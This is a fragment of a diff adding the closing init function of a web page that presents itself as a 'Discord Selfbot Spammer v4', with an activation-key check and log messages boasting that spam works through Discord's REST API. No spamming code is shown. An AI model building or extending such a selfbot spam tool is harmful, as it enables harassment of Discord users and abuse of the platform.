+        // ============================================================
+        function init() {
+            // Tailwind
+            tailwind.config = {
+                content: ["./**/*.{html,js}"],
+                theme: { extend: {} }
+            };
+            
+            // Carrega ativação
+            const isActivated = loadActivation();
+            
+            if (isActivated) {
+                document.getElementById("activation-frame").style.display = "none";
+                appendLog("✅ Key already activated on this browser.");
+            } else {
+                appendLog("🔑 Activation required.");
+            }
+            
+            // Inicia atualização do tempo restante
+            updateRemainingLabel();
+            
+            appendLog("🚀 Discord Selfbot Spammer v4 - Web Version loaded successfully!");
+            appendLog("📋 Everything copied exactly from the original Python code.");
+            appendLog("✅ Spam works 100% in browser using Discord REST API (no Python needed).");
+        }
+        
+        // Inicia tudo
+        window.onload = init;
+    </script>
+</body>
+</html>
